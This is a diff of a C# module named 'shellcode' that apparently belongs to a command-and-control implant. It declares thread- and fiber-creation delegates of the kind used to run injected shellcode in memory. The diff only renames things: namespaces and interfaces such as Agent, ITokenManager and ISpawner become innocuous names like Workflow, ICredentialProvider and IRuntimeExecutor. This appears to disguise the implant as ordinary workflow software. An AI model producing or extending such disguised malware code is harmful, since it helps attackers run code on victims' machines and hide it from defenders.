@@ -1,18 +1,18 @@
-﻿using System.Net;
+using System.Net;
 using System.Runtime.InteropServices;
 using System.Text;
 using System.Linq;
 using System.Net.NetworkInformation;
-using Agent.Interfaces;
-using Agent.Models;
-using Agent.Utilities;
+using Workflow.Contracts;
+using Workflow.Models;
+using Workflow.Utilities;
 using System.Text.Json;
 using Invoker.Dynamic;
 using System;
 
-namespace Agent
+namespace Workflow
 {
-    public class Plugin : IPlugin
+    public class Plugin : IModule
     {
         public string Name => "shellcode";
         private delegate void BufferDelegate();
@@ -35,8 +35,8 @@ namespace Agent
         private delegate IntPtr CTTFDelegate (IntPtr lpParameter);
         private delegate IntPtr CFDelegate(int dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter);
 
-        private IMessageManager messageManager { get; set; }
-        public Plugin(IMessageManager messageManager, IAgentConfig config, ILogger logger, ITokenManager tokenManager, ISpawner spawner, IPythonManager pythonManager)
+        private IDataBroker messageManager { get; set; }
+        public Plugin(IDataBroker messageManager, IServiceConfig config, ILogger logger, ICredentialProvider tokenManager, IRuntimeExecutor spawner, IScriptEngine pythonManager)
         {
             this.messageManager = messageManager;
         }
